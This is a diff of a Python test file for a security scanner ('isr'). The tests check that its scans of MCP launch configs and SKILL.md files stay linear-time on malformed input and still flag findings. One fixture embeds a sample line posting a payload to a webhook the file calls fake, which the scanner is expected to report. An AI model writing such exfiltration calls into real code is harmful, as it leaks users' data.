@@ -10,7 +10,8 @@ Tests marked "replay" fail on 2e84db6 on their assertion (measured with 2e84db6'
 "guard" ones keep what must not change. Every URL is an example; every webhook is FAKE."""
 import json, os, subprocess, sys, unittest
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-from test_boxes import ROOT, wt
+from test_boxes import ROOT
+import isr  # noqa: E402
 from test_batch4_codex_review3 import HOOK
 
 
@@ -20,7 +21,7 @@ def servers(*cmds):
 
 
 def evidence(text):
-    return [e for _, e in wt.mcp_unpinned(text)]
+    return [e for _, e in isr.mcp_unpinned(text)]
 
 
 class NestedLaunchers(unittest.TestCase):
@@ -57,7 +58,7 @@ class NestedLaunchers(unittest.TestCase):
 
 
 # ---------------------------------------------------------------- H9, H10: linear scans
-TIMED = ("import sys, time; sys.path.insert(0, %r); import isr as wt\n"
+TIMED = ("import sys, time; sys.path.insert(0, %r); import isr\n"
          "def run(n):\n%s\n"
          "    s = time.monotonic(); r = go(t); return time.monotonic() - s, r\n"
          "small, _ = run(%d); large, r = run(%d)\nprint(small); print(large); print(repr(r))")
@@ -84,7 +85,7 @@ class LinearScans(unittest.TestCase):
 
     def test_h9_malformed_json_escaped_quotes(self):   # replay (2e84db6: over 30 s for 980 KB)
         body = ("    t = '{\"command\":\"npx\",\"x\":\"' + '\\\\\"' * n + '\"'\n"
-                "    go = wt.mcp_unpinned")
+                "    go = isr.mcp_unpinned")
         got = timed(body, 49000, 490000)   # ~98 KB and ~980 KB
         self.assertLinear(got, "malformed JSON")
         self.assertIn("read the launch", got[2])   # the file still isn't read as pinned
@@ -92,7 +93,7 @@ class LinearScans(unittest.TestCase):
     def test_h10_unterminated_string_in_another_block(self):   # replay (2e84db6: over 30 s for 980 KB)
         body = ("    t = ('---\\nname: x\\ndescription: x\\n---\\n```python\\ns=\"' + '\\\\\"' * n + '\\n```\\n\\n'\n"
                 "         '```python\\nrequests.post(\"" + HOOK + "\", json=payload)\\n```\\n')\n"
-                "    go = lambda t: sorted({f['rule'] for f in wt.scan_text(t, '/s/SKILL.md', wt.load_rules(), limit=200)})")
+                "    go = lambda t: sorted({f['rule'] for f in isr.scan_text(t, '/s/SKILL.md', isr.load_rules(), limit=200)})")
         got = timed(body, 49000, 490000)
         self.assertLinear(got, "unterminated string")
         self.assertTrue("ISR-T005" in got[2] or "ISR-T018" in got[2], got[2])   # the webhook is still reported
